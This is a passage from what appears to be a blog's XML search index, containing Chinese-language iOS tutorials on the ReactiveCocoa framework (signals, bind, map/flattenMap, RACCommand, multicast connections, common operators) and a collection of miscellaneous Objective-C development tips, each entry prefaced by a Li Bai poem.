NSLog(@"请求最新商品"); // [subscriber sendNext:@"获取最新商品"]; return nil; &#125;]; // Selector调用:当所有信号都发送数据的时候调用 // 数组存放信号 // Selector注意点:参数根据数组元素决定 // Selector方法参数类型,就是信号传递出来数据 [self rac_liftSelector:@selector(updateUI:data2:) withSignalsFromArray:@[requestHot,requestNew]]; &#125; // 只要两个请求都请求完成的时候才会调用 - (void)updateUI:(NSString *)data1 data2:(NSString *)data2 &#123; NSLog(@"%@ %@",data1,data2); &#125; 监听属性改变12// 设置Label 文字跟着 TextField的改变而改变RAC(self.myLab, text) = self.myTF.rac_textSignal; 1234// 监听某一个属性的改变[RACObserve(self.per, name) subscribeNext:^(NSString *name) &#123; // name 即 self.per.name&#125;]; 数组1234NSArray *array = @[@1, @2, @3, @4, @5];[array.rac_sequence.signal subscribeNext:^(id x) &#123; // x 即 数组 array 的元素 &#125;]; 1234// 过滤 filter，并获取过滤后的数组NSArray *filter = [[array.rac_sequence filter:^BOOL(id value) &#123; return [value integerValue] &gt; 2;&#125;] array]; 123456// 匹配、映射 map，变换元素并获取新数组NSArray *map = [[array.rac_sequence map:^id(id value) &#123; NSInteger a = [value integerValue] * [value integerValue]; return [NSString stringWithFormat:@"%ld", a];&#125;] array]; 字典1234567// rac_keySequence 和 rac_valueSequence 跟数组一样// rac_sequence 需要 RACTupleUnpack 解包NSDictionary *dic = @&#123;@"name": @"lion", @"age": @18&#125;;[dic.rac_sequence.signal subscribeNext:^(id x) &#123; RACTupleUnpack(NSString *key, NSString *value) = x; NSLog(@"\r\nkey: %@\r\nvalue: %@", key, value);&#125;];]]></content>
      <categories>
        <category>iOS</category>
        <category>RAC</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>RAC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发ReactiveCocoa（六）：冷信号与热信号]]></title>
    <url>%2Farchives%2F53929de4.html</url>
    <content type="text"><![CDATA[谁家玉笛暗飞声，散入春风满洛城。此夜曲中闻折柳，何人不起故园情。 ——李白《春夜洛城闻笛》 冷信号与热信号特点 热信号是主动的，即使你没有订阅事件，它仍然会时刻推送。（例如它会推送值即使还没有订阅者）而冷信号是被动的，只有当你订阅的时候，它才会发送消息。 热信号可以有多个订阅者，是一对多，信号可以与订阅者共享信息。（订阅者1和订阅者2是共享的，他们都能在同一时间接收到某个值），而冷信号只能一对一，当有不同的订阅者，消息会从新完整发送。（两个订阅者没有联系，都是基于各自的订阅时间开始接收消息的）。 美团的几篇资料 （开发中可能遇到的坑） 细说ReactiveCocoa的冷信号与热信号1 细说ReactiveCocoa的冷信号与热信号2 细说ReactiveCocoa的冷信号与热信号3 RACSignal的Subscription深入分析]]></content>
      <categories>
        <category>iOS</category>
        <category>RAC</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>RAC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发ReactiveCocoa（五）：RAC底层bind]]></title>
    <url>%2Farchives%2Fa972913f.html</url>
    <content type="text"><![CDATA[故人西辞黄鹤楼，烟花三月下扬州。孤帆远影碧空尽，唯见长江天际流。 ——李白《送孟浩然之广陵》 bind方法简单介绍和使用123456789101112131415161718192021222324252627282930313233343536373839404142434445// 假设想监听文本框的内容，并且在每次输出结果的时候，都在文本框的内容拼接一段文字“输出：”// 方式一:在返回结果后，拼接。 [_textField.rac_textSignal subscribeNext:^(id x) &#123; NSLog(@"输出:%@",x); &#125;];// 方式二:在返回结果前，拼接，使用RAC中bind方法做处理。// bind方法参数:需要传入一个返回值是RACStreamBindBlock的block参数// RACStreamBindBlock是一个block的类型，返回值是信号，参数（value,stop），因此参数的block返回值也是一个block。// RACStreamBindBlock:// 参数一(value):表示接收到信号的原始值，还没做处理// 参数二(*stop):用来控制绑定Block，如果*stop = yes,那么就会结束绑定。// 返回值：信号，做好处理，在通过这个信号返回出去，一般使用RACReturnSignal,需要手动导入头文件RACReturnSignal.h。// bind方法使用步骤:// 1.传入一个返回值RACStreamBindBlock的block。// 2.描述一个RACStreamBindBlock类型的bindBlock作为block的返回值。// 3.描述一个返回结果的信号，作为bindBlock的返回值。// 注意：在bindBlock中做信号结果的处理。// 底层实现:// 1.源信号调用bind,会重新创建一个绑定信号。// 2.当绑定信号被订阅，就会调用绑定信号中的didSubscribe，生成一个bindingBlock。// 3.当源信号有内容发出，就会把内容传递到bindingBlock处理，调用bindingBlock(value,stop)// 4.调用bindingBlock(value,stop)，会返回一个内容处理完成的信号（RACReturnSignal）。// 5.订阅RACReturnSignal，就会拿到绑定信号的订阅者，把处理完成的信号内容发送出来。// 注意:不同订阅者，保存不同的nextBlock，看源码的时候，一定要看清楚订阅者是哪个。// 这里需要手动导入#import &lt;ReactiveCocoa/RACReturnSignal.h&gt;，才能使用RACReturnSignal。[[_textField.rac_textSignal bind:^RACStreamBindBlock&#123; // 什么时候调用: // block作用:表示绑定了一个信号. return ^RACStream *(id value, BOOL *stop)&#123; // 什么时候调用block:当信号有新的值发出，就会来到这个block。 // block作用:做返回值的处理 // 做好处理，通过信号返回出去. return [RACReturnSignal return:[NSString stringWithFormat:@"输出:%@",value]]; &#125;;&#125;] subscribeNext:^(id x) &#123; NSLog(@"%@",x);&#125;];]]></content>
      <categories>
        <category>iOS</category>
        <category>RAC</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>RAC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发ReactiveCocoa（四）：Flattenmap和Map]]></title>
    <url>%2Farchives%2F8b316e8d.html</url>
    <content type="text"><![CDATA[峨眉山月半轮秋，影入平羌江水流。夜发清溪向三峡，思君不见下渝州。 ——李白《峨眉山月歌》 flattenMap和Map flattenMap，Map用于把源信号内容映射成新的内容 flattenMap简单使用 12345678910111213141516171819202122232425262728// 监听文本框的内容改变，把结构重新映射成一个新值.// flattenMap作用:把源信号的内容映射成一个新的信号，信号可以是任意类型。// flattenMap使用步骤:// 1.传入一个block，block类型是返回值RACStream，参数value// 2.参数value就是源信号的内容，拿到源信号的内容做处理// 3.包装成RACReturnSignal信号，返回出去。// flattenMap底层实现:// 0.flattenMap内部调用bind方法实现的,flattenMap中block的返回值，会作为bind中bindBlock的返回值。// 1.当订阅绑定信号，就会生成bindBlock。// 2.当源信号发送内容，就会调用bindBlock(value, *stop)// 3.调用bindBlock，内部就会调用flattenMap的block，flattenMap的block作用：就是把处理好的数据包装成信号。// 4.返回的信号最终会作为bindBlock中的返回信号，当做bindBlock的返回信号。// 5.订阅bindBlock的返回信号，就会拿到绑定信号的订阅者，把处理完成的信号内容发送出来。[[_textField.rac_textSignal flattenMap:^RACStream *(id value) &#123; // block什么时候 : 源信号发出的时候，就会调用这个block。 // block作用 : 改变源信号的内容。 // 返回值：绑定信号的内容. return [RACReturnSignal return:[NSString stringWithFormat:@"输出:%@",value]];&#125;] subscribeNext:^(id x) &#123; // 订阅绑定信号，每当源信号发送内容，做完处理，就会调用这个block。 NSLog(@"%@",x);&#125;]; Map简单使用: 123456789101112131415161718192021222324// 监听文本框的内容改变，把结构重新映射成一个新值.// Map作用:把源信号的值映射成一个新的值// Map使用步骤:// 1.传入一个block,类型是返回对象，参数是value// 2.value就是源信号的内容，直接拿到源信号的内容做处理// 3.把处理好的内容，直接返回就好了，不用包装成信号，返回的值，就是映射的值。// Map底层实现:// 0.Map底层其实是调用flatternMap,Map中block中的返回的值会作为flatternMap中block中的值。// 1.当订阅绑定信号，就会生成bindBlock。// 3.当源信号发送内容，就会调用bindBlock(value, *stop)// 4.调用bindBlock，内部就会调用flattenMap的block// 5.flattenMap的block内部会调用Map中的block，把Map中的block返回的内容包装成返回的信号。// 5.返回的信号最终会作为bindBlock中的返回信号，当做bindBlock的返回信号。// 6.订阅bindBlock的返回信号，就会拿到绑定信号的订阅者，把处理完成的信号内容发送出来。 [[_textField.rac_textSignal map:^id(id value) &#123; // 当源信号发出，就会调用这个block，修改源信号的内容 // 返回值：就是处理完源信号的内容。 return [NSString stringWithFormat:@"输出:%@",value];&#125;] subscribeNext:^(id x) &#123; NSLog(@"%@",x);&#125;]; FlatternMap和Map的区别 FlatternMap中的Block返回信号。 Map中的Block返回对象。 开发中，如果信号发出的值不是信号，映射一般使用Map 开发中，如果信号发出的值是信号，映射一般使用FlatternMap 总结：signalOfsignals用FlatternMap 123456789101112131415161718// 创建信号中的信号RACSubject *signalOfsignals = [RACSubject subject];RACSubject *signal = [RACSubject subject];[[signalOfsignals flattenMap:^RACStream *(id value) &#123; // 当signalOfsignals的signals发出信号才会调用 return value;&#125;] subscribeNext:^(id x) &#123; // 只有signalOfsignals的signal发出信号才会调用，因为内部订阅了bindBlock中返回的信号，也就是flattenMap返回的信号。 // 也就是flattenMap返回的信号发出内容，才会调用。 NSLog(@"%@aaa",x);&#125;];// 信号的信号发送信号[signalOfsignals sendNext:signal];// 信号发送内容[signal sendNext:@1];]]></content>
      <categories>
        <category>iOS</category>
        <category>RAC</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>RAC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发ReactiveCocoa（三）：RACMulticastConnection]]></title>
    <url>%2Farchives%2Ffec44934.html</url>
    <content type="text"><![CDATA[朝辞白帝彩云间，千里江陵一日还。两岸猿声啼不住，轻舟已过万重山。 ——李白《早发白帝城》 RACMulticastConnection 用于当一个信号，被多次订阅时，为了保证创建信号时，避免多次调用创建信号中的block，造成副作用，可以使用这个类处理。 使用注意:RACMulticastConnection通过RACSignal的-publish或者-muticast:方法创建. RACMulticastConnection使用步骤: 创建信号 + (RACSignal *)createSignal:(RACDisposable * (^)(id&lt;RACSubscriber&gt; subscriber))didSubscribe 创建连接 RACMulticastConnection *connect = [signal publish]; 订阅信号,注意：订阅的不在是之前的信号，而是连接的信号：connect.signal 连接 [connect connect] RACMulticastConnection底层原理: 创建connect，connect.sourceSignal -&gt; RACSignal(原始信号) connect.signal -&gt; RACSubject 订阅connect.signal，会调用RACSubject的subscribeNext，创建订阅者，而且把订阅者保存起来，不会执行block。 [connect connect]内部会订阅RACSignal(原始信号)，并且订阅者是RACSubject- 订阅原始信号，就会调用原始信号中的didSubscribe - didSubscribe，拿到订阅者调用sendNext，其实是调用RACSubject的sendNext RACSubject的sendNext,会遍历RACSubject所有订阅者发送信号。- 因为刚刚第二步，都是在订阅RACSubject，因此会拿到第二步所有的订阅者，调用他们的nextBlock 需求：假设在一个信号中发送请求，每次订阅一次都会发送请求，这样就会导致多次请求。解决：使用RACMulticastConnection就能解决. 1234567891011121314151617181920212223242526272829303132333435363738// 1.创建请求信号RACSignal *signal = [RACSignal createSignal:^RACDisposable *(id&lt;RACSubscriber&gt; subscriber&#123; NSLog(@"发送请求"); return nil;&#125;];// 2.订阅信号[signal subscribeNext:^(id x) &#123; NSLog(@"接收数据");&#125;];// 2.订阅信号[signal subscribeNext:^(id x) &#123; NSLog(@"接收数据");&#125;];// 3.运行结果，会执行两遍发送请求，也就是每次订阅都会发送一次请求// RACMulticastConnection:解决重复请求问题// 1.创建信号RACSignal *signal = [RACSignal createSignal:^RACDisposable *(id&lt;RACSubscriber&gt; subscriber) &#123; NSLog(@"发送请求"); [subscriber sendNext:@1]; return nil;&#125;];// 2.创建连接RACMulticastConnection *connect = [signal publish];// 3.订阅信号，// 注意：订阅信号，也不能激活信号，只是保存订阅者到数组，必须通过连接,当调用连接，就会一次性调用所有订阅者的sendNext:[connect.signal subscribeNext:^(id x) &#123; NSLog(@"订阅者一信号");&#125;];[connect.signal subscribeNext:^(id x) &#123; NSLog(@"订阅者二信号");&#125;];// 4.连接,激活信号[connect connect];]]></content>
      <categories>
        <category>iOS</category>
        <category>RAC</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>RAC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发ReactiveCocoa（二）：RACCommand篇]]></title>
    <url>%2Farchives%2F63f63348.html</url>
    <content type="text"><![CDATA[日照香炉生紫烟，遥看瀑布挂前川。飞流直下三千尺，疑是银河落九天。 ——李白《望庐山瀑布》 RACCommand 简单使用 RAC中用于处理事件的类，可以把事件如何处理,事件中的数据如何传递，包装到这个类中，他可以很方便的监控事件的执行过程。 executionSignals是signal of signals，如果直接subscribe的话会得到一个signal，而不是我们想要的value，所以一般会配合switchToLatest。 errors : 跟正常的signal不一样，RACCommand的错误不是通过sendError来实现的，而是通过errors属性传递出来的。 executing 表示该command当前是否正在执行。 一、RACCommand使用步骤: 创建命令 initWithSignalBlock:(RACSignal*(^)(id input))signalBlock 在signalBlock中，创建RACSignal，并且作为signalBlock的返回值 执行命令 - (RACSignal *)execute:(id)input 二、RACCommand使用注意: signalBlock必须要返回一个信号，不能传nil. 如果不想要传递信号，直接创建空的信号[RACSignal empty]; RACCommand中信号如果数据传递完，必须调用[subscriber sendCompleted]，这时命令才会执行完毕，否则永远处于执行中。 三、RACCommand设计思想：内部signalBlock为什么要返回一个信号，这个信号有什么用。 在RAC开发中，通常会把网络请求封装到RACCommand，直接执行某个RACCommand就能发送请求。 当RACCommand内部请求到数据的时候，需要把请求的数据传递给外界，这时候就需要通过signalBlock返回的信号传递了。 四、如何拿到RACCommand中返回信号发出的数据。 RACCommand有个执行信号源executionSignals，这个是signal of signals(信号的信号),意思是信号发出的数据是信号，不是普通的类型。 订阅executionSignals就能拿到RACCommand中返回的信号，然后订阅signalBlock返回的信号，就能获取发出的值。 五、监听当前命令是否正在执行executing六、使用场景,监听按钮点击，网络请求 1234567891011121314151617181920212223242526272829303132333435363738394041424344// 1.创建命RACCommand *command = [[RACCommand alloc] initWithSignalBlock:^RACSignal *(id input) &#123; NSLog(@"执行命令"); // 创建空信号,必须返回信号 // return [RACSignal empty]; // 2.创建信号,用来传递数据 return [RACSignal createSignal:^RACDisposable *(id&lt;RACSubscriber&gt; subscriber) &#123; [subscriber sendNext:@"请求数据"]; // 注意：数据传递完，最好调用sendCompleted，这时命令才执行完毕。 [subscriber sendCompleted]; return nil; &#125;]; &#125;]; // 强引用命令，不要被销毁，否则接收不到数据 _conmmand = command; // 3.订阅RACCommand中的信号 [command.executionSignals subscribeNext:^(id x) &#123; [x subscribeNext:^(id x) &#123; NSLog(@"%@",x); &#125;]; &#125;]; // RAC高级用法 // switchToLatest:用于signal of signals，获取signal of signals发出的最新信号,也就是可以直接拿到RACCommand中的信号 [command.executionSignals.switchToLatest subscribeNext:^(id x) &#123; NSLog(@"%@",x); &#125;]; // 4.监听命令是否执行完毕,默认会来一次，可以直接跳过，skip表示跳过第一次信号。 [[command.executing skip:1] subscribeNext:^(id x) &#123; if ([x boolValue] == YES) &#123; // 正在执行 NSLog(@"正在执行"); &#125; else &#123; // 执行完成 NSLog(@"执行完成"); &#125;&#125;];// 5.执行命令[self.conmmand execute:@1];]]></content>
      <categories>
        <category>iOS</category>
        <category>RAC</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>RAC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发ReactiveCocoa（一）：介绍]]></title>
    <url>%2Farchives%2F48d913e0.html</url>
    <content type="text"><![CDATA[君不见黄河之水天上来，奔流到海不复回。君不见高堂明镜悲白发，朝如青丝暮成雪。人生得意须尽欢，莫使金樽空对月。天生我材必有用，千金散尽还复来。烹羊宰牛且为乐，会须一饮三百杯。岑夫子，丹丘生，将进酒，杯莫停。与君歌一曲，请君为我侧耳听。钟鼓馔玉不足贵，但愿长醉不复醒。古来圣贤皆寂寞，惟有饮者留其名。陈王昔时宴平乐，斗酒十千恣欢谑。主人何为言少钱，径须沽取对君酌。五花马，千金裘，呼儿将出换美酒，与尔同销万古愁。 ——李白《将进酒·君不见黄河之水天上来》 ReactiveCocoa 是函数响应编程(Functional Reactive Programming, FRP)框架 实际的开发中是和MVVM结合进行开发、互相弥补 Github上整合的比较全面的（MVVM、RAC）学习资料 Github 上面比较全的资料 美团的几篇资料 （开发中可能遇到的坑） 细说ReactiveCocoa的冷信号与热信号1 细说ReactiveCocoa的冷信号与热信号2 细说ReactiveCocoa的冷信号与热信号3 RACSignal的Subscription深入分析 注意点 RAC只处理对象, 而不处理像BOOL这样的原始值. 不过, RAC通常会帮我们自动做这些转换. 使用Cocoapods导入ReactiveCocoa 报错 ld: library not found for -lPods 解决方法 : Target’s General settings and go to Linked Frameworks and Libraries and just delete -libPods.a from the list. 信号的释放 ReactiveCocoa维护了一个全局的信号集合。 如果信号有一个或多个订阅者，它就是可用的。如果所有订阅者都被移除了，信号就被释放了。 信号的取消订阅 在一个completed事件或error事件后，一个订阅者会自动将自己移除。 手动移除可能通过RACDisposable来完成。RACSignal的所有订阅方法都返回一个RACDisposable实例，我们可以调用它的dispose方法来手动移除订阅者。 如果我们创建了一个信号，但不去订阅它，则信号永远不会执行，包括任何如doNext:这样的附加操作。 Signal events是线性的，不会出现并发的情况，除非显式地指定Scheduler。所以subscribeNext:error:completed:里的block不需要锁定或者synchronized等操作，其他的events会依次排队，直到block处理完成。 生成Signal时，最好指定Name, -setNameWithFormat: 方便调试 Side Effect （副作用） Hot signals without side effects 最好使用property，如“textChanged”，不太理解什么情况用到这个，权当做一个静态的属性来看就行。 Cold signals without side effects 使用名词类型的方法名，如“-currentText”，“currentModels”，同时表明了返回值是什么（这个尤其得注意，RACSignal的next值是id类型，所以全得是靠约定才知道具体返回类型） Signals with side effects 这种就是像login一样有副作用的了，推荐使用动词类型的方法名，用对动词基本就能知道是不是有副作用了，比如“-loginSignal”和“-saveToFile”大概就知道前面一个很可能有副作用，后面一个多存几次文件应该没副作用 RAC VS 原生 rac_signalForSelector：用于替代代理 rac_valuesAndChangesForKeyPath：用于监听某个对象的属性改变 rac_signalForControlEvents：用于监听某个事件。 rac_addObserverForName:用于监听某个通知 rac_textSignal:只要文本框发出改变就会发出这个信号 处理当界面有多次请求时，需要都获取到数据时，才能展示界面 rac_liftSelector:withSignalsFromArray:Signals:当传入的Signals(信号数组)，每一个signal都至少sendNext过一次，就会去触发第一个selector参数的方法 使用注意：几个信号，参数一的方法就几个参数，每个参数对应信号发出的数据 RAC提供的宏 RAC() 你提供想要与即将到来的值绑定的对象和参数, 在其内部它所做的是创建一个订阅者并更新其属性的值 这个宏是最常用的，RAC()总是出现在等号左边，等号右边是一个RACSignal，表示的意义是将一个对象的一个属性和一个signal绑定，signal每产生一个value（id类型），都会自动执行：[TARGET setValue:value ?: NIL_VALUE forKeyPath:KEYPATH]; 12345RACSignal *usernameIsValidSignal = RACObserve(self.viewModel, isUsernameValid);RAC(self.goButton, enabled) = usernameIsValidSignal; RAC(self.goButton, alpha) = [usernameIsValidSignal map:^id(NSNumber *usernameIsValid)&#123; return usernameIsValid.boolValue ? @1.0 : @0.5; &#125;]; RACObserve() 这个宏是RAC中对KVO中那些API的替代. 你只需要传入对象和你想观察的那个对象某属性的 keypath. 给出这些参数后, RACObserve会创建一个信号, 一旦它有了订阅者, 它就立刻发送那个属性的当前值, 并在发送那个属性在这之后的任何变化. 123456// create and get a reference to the signal RACSignal *usernameValidSignal = RACObserve(self.viewModel, isUsernameValid);// update the local property when this value changes[usernameValidSignal subscribeNext: ^(NSNumber *isValidNumber) &#123;self.usernameIsValid = isValidNumber. boolValue&#125;]; 循环引用的宏 @weakify(self); // 在外面声明 @strongify(self); // 在引用的地方声明 这两个宏一定成对出现，先weak再strong 常用知识点 map : 将一个值转化为另一个值输出 将会创建一个和原来一模一样的信号，只不过新的信号传递的值变为了block（value），也就是说，如果block(value)是一个信号，那么就是信号的value仍然是信号。 flattenMap : 解决Signal of Signals问题，flattenMap则会继续调用这个信号的value，作为新的信号的value。 switchToLatest : 用于signal of signals，获取signal of signals发出的最新信号,也就是可以直接拿到RACCommand中的信号 filter : 过滤一些条件，以确保符合条件的值才能被传递出去 ignore : 忽略给定的值 注意，这里忽略的既可以是地址相同的对象，也可以是- isEqual:结果相同的值，也就是说自己写的Model对象可以通过重写- isEqual:方法来使- ignore:生效。常用的值的判断没有问题，如下: 1234[[self.inputTextField.rac_textSignal ignore:@"seven"] subscribeNext:^(NSString *value)&#123;NSLog(@"`seven` could never appear : %@", value);&#125;]; distinctUntilChanged : 它将这一次的值与上一次做比较，当相同时（也包括- isEqual:）被忽略掉。 1234RAC(self.label, text) = [RACObserve(self.user, username) distinctUntilChanged];self.user.username = @"sunnyxx"; // 1stself.user.username = @"sunnyxx"; // 2ndself.user.username = @"sunnyxx"; // 3rd 如果不增加distinctUntilChanged的话对于连续的相同的输入值就会有不必要的处理，这个栗子只是简单的UI刷新，但遇到如写数据库，发网络请求的情况时，代价就不能购忽略了。 所以，对于相同值可以忽略的情况，果断加上它吧。 起止点过滤类型 除了被动的当next值来的时候做判断，也可以主动的提前选择开始和结束条件，分为两种类型： take型（取） skip型(跳) take:(NSUInteger) : 从开始一共取N次的next值，不包括Competion和Error，如： 123456789[[[RACSignal createSignal:^RACDisposable *(id&lt;RACSubscriber&gt; subscriber) &#123;[subscriber sendNext:@"1"];[subscriber sendNext:@"2"];[subscriber sendNext:@"3"];[subscriber sendCompleted];return nil;&#125;] take:2] subscribeNext:^(id x) &#123;NSLog(@"only 1 and 2 will be print: %@", x);&#125;]; takeLast:(NSUInteger) : 取最后N次的next值 注意，由于一开始不能知道这个Signal将有多少个next值，所以RAC实现它的方法是将所有next值都存起来，然后原Signal完成时再将后N个依次发送给接收者 但Error发生时依然是立刻发送的 takeUntil:(RACSignal *) : 当给定的signal完成前一直取值, 也就是这个Signal一直到textField执行dealloc时才停止。最简单的栗子就是UITextField的rac_textSignal的实现（删减版本）: 123456789- (RACSignal *)rac_textSignal &#123;@weakify(self);return [[[[[RACSignal concat:[self rac_signalForControlEvents:UIControlEventEditingChanged]] map:^(UITextField *x) &#123; return x.text; &#125;] takeUntil:self.rac_willDeallocSignal] // bingo!&#125; takeUntilBlock:(BOOL(^)(id x)) : 对于每个next值，运行block，当block返回YES时停止取值，如： 12345[[self.inputTextField.rac_textSignal takeUntilBlock:^BOOL(NSString *value) &#123;return [value isEqualToString:@"stop"];&#125;] subscribeNext:^(NSString *value) &#123;NSLog(@"current value is not `stop`: %@", value);&#125;]; takeWhileBlock:(BOOL(^)(id x)) : 上面的反向逻辑，对于每个next值，block返回 YES时才取值 skip:(NSUInteger) : 从开始跳过N次的next值，简单的栗子： 123456789[[[RACSignal createSignal:^RACDisposable *(id&lt;RACSubscriber&gt; subscriber) &#123;[subscriber sendNext:@"1"];[subscriber sendNext:@"2"];[subscriber sendNext:@"3"];[subscriber sendCompleted];return nil;&#125;] skip:1] subscribeNext:^(id x) &#123;NSLog(@"only 2 and 3 will be print: %@", x);&#125;]; skipUntilBlock:(BOOL(^)(id x)) : 和- takeUntilBlock:同理，一直跳，直到block为YES skipWhileBlock:\(BOOL(^)(id x)) : 和- takeWhileBlock:同理，一直跳，直到block为NO merge : 合并信号，只要有一个信号变化就会调用 12345678@weakify(self); [[RACSignal merge: @[RACObserve(self.viewModel, tweets),RACObserve(self.viewModel, allTweetsLoaded)]]bufferWithTime: 0 onScheduler: [RACScheduler mainThreadScheduler]]subscribeNext: ^(id value) &#123;@strongify(self);[self.tableView reloadData];&#125;]; combineLatest : 将多个信号合并起来，并且拿到各个信号的最新的值,必须每个合并的signal至少都有过一次sendNext，才会触发合并的信号 根据组合的信号的值再转换生成判断条件 1234567RACSignal *signupActiveSignal = [RACSignal combineLatest:@[validUsernameSignal,validPwdSignal] reduce:^id(NSNumber *usernameValid, NSNumber *passwordValid) &#123;return @(usernameValid.boolValue &amp;&amp; passwordValid.boolValue);&#125;];[signupActiveSignal subscribeNext:^(NSNumber *state) &#123;self.signInButton.enabled = state.boolValue;&#125;]; doNext: 注意doNext:并不返回一个值，因为它是附加操作。它完成时不改变事件。 concat: 按一定顺序拼接信号，当多个信号发出的时候，有顺序的接收信号 （只需要订阅拼接的信号就可以了） then: then方法会等到completed事件发出后调用，然后订阅由then:block参数返回的信号。这有效地将控制从一个信号传递给下一个信号 zipWith: 把两个信号压缩成一个信号，只有当两个信号同时发出信号内容时，并且把两个信号的内容合并成一个元组，才会触发压缩流的next事件 RACScheduler : 是RAC里面对线程的简单封装，事件可以在指定的scheduler上分发和执行， 不特殊指定的话，事件的分发和执行都在一个默认的后台线程里面做，大多数情况也就不用动了 有一些特殊的signal必须在主线程调用，使用-deliverOn：可以切换调用的线程。 deliverOn: 更新UI的时候回到主线程执行（子线程加载图片、主线程刷新UI） 1deliverOn:[RACScheduler mainThreadScheduler] chain : multicast : 避免副作用，这两个订阅者接收到了同样的一个请求的内容 1234567891011// Starts a single request, no matter how many subscriptions `connection.signal`// gets. This is equivalent to the -replay operator, or similar to// +startEagerlyWithScheduler:block:.RACMulticastConnection *connection = [networkRequest multicast:[RACReplaySubject subject]];[connection connect];[connection.signal subscribeNext:^(id response) &#123; NSLog(@"subscriber one: %@", response);&#125;];[connection.signal subscribeNext:^(id response) &#123; NSLog(@"subscriber two: %@", response);&#125;]; timeout : 超时，可以让一个信号在一定的时间后，自动报错 interval : 定时，每隔一段时间发出信号 delay : 延迟发送next retry重试 : 只要失败，就会重新执行创建信号中的block,直到成功 replay重放 : 当一个信号被多次订阅,反复播放内容 throttle节流 : 当某个信号发送比较频繁时，可以使用节流，在某一段时间不发送信号内容，过了一段时间获取信号的最新内容发出 延时处理，只有在两次next事件间隔指定的时间时才会发送第二个next事件]]></content>
      <categories>
        <category>iOS</category>
        <category>RAC</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>RAC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发中碎片知识整理]]></title>
    <url>%2Farchives%2Ffd0d6f33.html</url>
    <content type="text"><![CDATA[镜湖三百里，菡萏发荷花。五月西施采，人看隘若耶。回舟不待月，归去越王家。 ——李白《子夜四时歌·夏歌》 琐碎分类与扩展 分类（Category） 只能扩充方法、不能扩充成员变量 不是说不能写property属性，而是写了只会有对应的setter和getter方法的声明，而没有这这两个方法的实现 （UIView扩充的那些只是重写了方法 并不是添加了新的属性变量） 可以用runtime添加属性 匿名分类 （括号里没有名称） 可以扩充方法、也可以扩充成员变量 一篇比较详细深入的参考资料 Automatic Preferred Max Layout Width 警告解决办法 CocoaPods导入格式 第一种写法（没更新到cocoapods最近版本可用） 12platform : ios, '7.0'pod 'AFNetworking' 第二种写法 （更新到最新的版本第一种写法报错） 1234platform :ios, '7.0'target "iOS项目名" dopod 'FMDB'end 如何退出VIM编辑器 i 是进入编辑 进入编辑状态后按 ：esc 再按 shift＋zz，注意是两下z nil、Nil、NULL的区别 nil：指向oc中对象的空指针，针对对象。 Nil：指向oc中类的空指针，针对类。 NULL：指向其他类型的空指针，如一个c类型的内存指针，基本数据类型为空，基本类型。 NSNull：在集合对象中，表示空值的对象。 若obj为nil： ［obj message］将返回NO,而不是NSException 若obj为NSNull: ［obj message］将抛出异常NSException 处理服务器返回的null空数据 用AFN请求网络时可以使用self.removesKeysWithNullValues = YES; 使用分类 NullSafe 直接将NullSafe.m文件拖到项目中，不需要引入任何.h头文件。可以在运行时自动将JSON中的null值替换成nil。 github地址 终极解决办法：MJExtension实现字典转模型。 App跳转方法1[[UIApplication sharedApplication] openURL:[NSURL URLWithString:[NSString stringWithFormat:@"itms-apps://itunes.apple.com/app/id%@", myAppID]]]; 获取Window的区别123AppDelegate* appDelegate = (AppDelegate*)[UIApplication sharedApplication].delegate;UIWindow* window = appDelegate.window;UIWindow* keyw = [UIApplication sharedApplication].keyWindow; 在没有使用UIAlertView时，两者一样，均为我们应用的的Window，其delegate为我们的rootViewController。 在调用了UIAlertView show之后，到UIAlertView消失之前，keyw的值是UIAlertControllerShimPresenterWindow，其delegate是UIAlertShimPresentingViewController。 版本号区别 CFBundleShortVersionString 该标志表示就是应用的版本号，一般是由三个整数分隔组成的字符串。第一个整数代表重大修改的版本，如实现新的功能或重大变化的修订。第二个整数表示的修订，实现较突出的特点。第三个整数代表维护版本。 该键的值不同于“CFBundleVersion”标识 CFBundleShortVersionString对应Xcode里项目的Version CFBundleVersion 标识应用的内部版本号 这个版本是内部自己团队使用的一个版本号，一般不对外公开。 CFBundleVersion 对应Xcode里项目的Build 点击UIButton弹出UIPickerView1234567891011121314151617181920212223// 用来弹出控件 UITextField *pickerViewTextField = [[UITextField alloc] initWithFrame:CGRectZero]; [self.view addSubview:pickerViewTextField]; self.pickerViewTextField = pickerViewTextField; // 设置选择控件 UIPickerView *pickerView = [[UIPickerView alloc] init]; pickerView.delegate = self; pickerView.dataSource = self; pickerView.showsSelectionIndicator = YES; self.pickerView = pickerView; pickerViewTextField.inputView = pickerView;// 工具条 UIToolbar *toolbar = [[UIToolbar alloc] init]; toolbar.height = 44; UIBarButtonItem *item0 = [[UIBarButtonItem alloc] initWithTitle:@"取消" style:UIBarButtonItemStylePlain target:self action:@selector(cancelBtnClick)]; UIBarButtonItem *item1 = [[UIBarButtonItem alloc] initWithBarButtonSystemItem:UIBarButtonSystemItemFlexibleSpace target:nil action:nil]; UIBarButtonItem *item2 = [[UIBarButtonItem alloc] initWithTitle:@"完成" style:UIBarButtonItemStylePlain target:self action:@selector(conformBtnClick)]; toolbar.items = @[item0, item1, item2]; pickerViewTextField.inputAccessoryView = toolbar;// 一定要写 不然弹不出来 [pickerViewTextField becomeFirstResponder]; UITableViewCellUITableViewCell背景颜色 UITableViewCell 设置背景颜色必须是ContentView 自定义XIB可能没有ContentView，也需要自己创建 UITableViewCell选中颜色 iOS6之前可以设置选中颜色为灰色、蓝色、没有颜色；iOS7开始只有默认灰色和没有颜色两种，需要的话可以自定义选中背景设置想要的颜色 UITableViewCellSelectionStyleBlue The cell has a default background color when selected. In iOS 7, the selection color is no longer blue. Use UITableViewCellSelectionStyleDefault instead. 1234UIView 